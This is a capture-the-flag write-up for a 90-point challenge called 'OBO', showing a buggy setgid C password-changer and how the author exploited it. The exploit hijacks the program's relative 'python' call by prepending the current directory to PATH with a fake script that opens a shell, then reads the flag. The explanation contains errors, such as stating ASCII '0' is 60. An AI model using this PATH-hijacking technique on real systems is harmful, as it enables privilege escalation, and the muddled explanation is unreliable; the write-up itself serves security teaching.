### Solved by et0x

OBO is a 90 point miscellaneous challenge. 

> This password changing program was written by an inexperienced C programmer. Can you some find bugs and exploit them to get the flag?

The source code for the program is as follows:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

const char *password_file_path = "/home/obo/password.txt";

int hex_table[256];

void generate_hex_table(void) {
  int i;
  for (i = 0; i <= 256; ++i) {
    hex_table[i] = -1;
  }

  for (i = 0; i <= 10; ++i) {
    hex_table['0' + i] = i;
  }

  for (i = 0; i <= 6; ++i) {
    hex_table['a' + i] = 10 + i;
  }

  for (i = 0; i <= 6; ++i) {
    hex_table['A' + i] = 10 + i;
  }

  // I don't know why, but I was getting errors, and this fixes it.
  hex_table[0] = 0;
}

int read_password(FILE *file, char *password, size_t n) {
  fgets(password, n, file);
  password[strcspn(password, "\n")] = '\0';
}

void change_password(char *password) {
  char cmd[128];
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  // C is too hard, so I did the password changing in Python.
  snprintf(cmd, sizeof(cmd), "python set_password.py \"%s\"", password);
  system(cmd);
}

int main(int argc, char **argv) {
  int i;
  FILE *password_file;
  int digits[16] = {0};
  char password[64];
  char new_password[64];
  char confirm_password[64];

  generate_hex_table();

  password_file = fopen(password_file_path, "r");
  if (password_file == NULL) {
    perror("fopen");
    return 1;
  }
  read_password(password_file, password, sizeof(password));
  fclose(password_file);

  printf("New password: ");
  fflush(stdout);
  read_password(stdin, new_password, sizeof(new_password));
  for (i = 0; i <= strlen(new_password); ++i) {
    int index = hex_table[(unsigned char) new_password[i]];
    if (index == -1) {
      printf("Invalid character: %c\n", new_password[i]);
      exit(1);
    }
    digits[index] = 1;
  }

  for (i = 0; i <= 16; ++i) {
    if (digits[i] == 0) {
      printf("Password is not complex enough: %d\n", i);
      return 1;
    }
  }

  printf("Confirm old password: ");
  fflush(stdout);
  read_password(stdin, confirm_password, sizeof(confirm_password));
  if (strcmp(confirm_password, password) != 0) {
    printf("Old password is incorrect.\n");
    return 1;
  }

  change_password(new_password);
  printf("Password changed!\n");
  return 0;
}
```

The hint to this one says that if you can find out why the programmer was getting errors (as indicated by the comments in the source code), you should be able to figure out how to beat this one.

So in a nutshell, the generate_hex_table() function fills the hex_table array with all -1's, then it goes back and fills the array with the value of i, starting at hex_table['0'+i].  (Ascii '0' = 60, so hex_table[60+0] = '0'... and so forth for each of the subsequent loops)

The error comes in because the function that checks that the password is complex enough will always come back with a -1 because hex_table[0] = -1, which causes execution to break.  Also, in order to meet complexity requirements, you have to enter '0123456789abcdefg' for your input at the first prompt.  Through the course of testing different values here, it was discovered that the program allows hex A-G, instead of A-F due to a one off programming error, and also that if you throw in hex \x01 when it asks for a password, it'll bypass the complexity check and jump straight to the password changing python script.  The only problem is that the python script doesn't do anything.

```bash
pico1139@shell:/home/obo$ cat set_password.py
#!/usr/bin/python
print 'Not yet implemented.'
```

As you can see though, the call to the python program uses a relative path:

```c
snprintf(cmd, sizeof(cmd), "python set_password.py \"%s\"", password);
```


We should be able to create our own script called "python", place it somewhere we have write access to, and change the environment variables so that it starts with our current directory.

```bash
pico1139@shell:/home/obo$ cd ~
pico1139@shell:~$ PATH=.:$PATH
pico1139@shell:~$ cat python
#!/bin/dash
/bin/dash
pico1139@shell:~$ /home/obo/obo
New password: abcdefg0123456789
Confirm old password: ^A
$ id
uid=11066(pico1139) gid=1013(obo) groups=1017(picogroup)
$ cd /home/obo
$ cat flag.txt
watch_your_bounds
```



